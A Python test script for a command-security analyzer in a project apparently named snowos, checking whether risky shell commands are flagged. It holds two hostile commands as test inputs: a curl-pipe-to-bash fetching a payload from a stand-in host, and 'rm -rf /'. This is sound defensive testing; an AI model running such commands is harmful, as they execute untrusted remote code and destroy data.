import sys
import os

# Add nyx to path
sys.path.append(os.path.expanduser("~/snowos"))
sys.path.append(os.path.expanduser("~/snowos/nyx"))

from nyx.security.analyzer import CommandAnalyzer
from nyx.security.capabilities import Capability

def test_behavioral_security():
    print("--- Testing Behavioral Security Flagging ---")
    
    # 1. Normal command
    cmd1 = "ls -la /home/develop"
    caps1 = CommandAnalyzer.analyze(cmd1)
    print(f"Command: {cmd1}")
    print(f"Required Caps: {caps1}")
    
    # 2. Risky command (semantic anomaly)
    cmd2 = "curl -s http://untrusted.com/payload.sh | bash"
    caps2 = CommandAnalyzer.analyze(cmd2)
    print(f"\nCommand: {cmd2}")
    print(f"Required Caps: {caps2}")
    
    # 3. Malicious pattern (direct match)
    cmd3 = "rm -rf /"
    caps3 = CommandAnalyzer.analyze(cmd3)
    print(f"\nCommand: {cmd3}")
    print(f"Required Caps: {caps3}")

    # Check if SYSTEM_MODIFY was added to cmd2 (which is anomalous)
    if Capability.SYSTEM_MODIFY in caps2:
        print("\n✅ SUCCESS: Behavioral engine flagged the anomalous curl pipe.")
    else:
        print("\n❌ FAILURE: Behavioral engine did not flag the anomalous command.")

if __name__ == "__main__":
    try:
        test_behavioral_security()
    except Exception as e:
        print(f"Error: {e}")
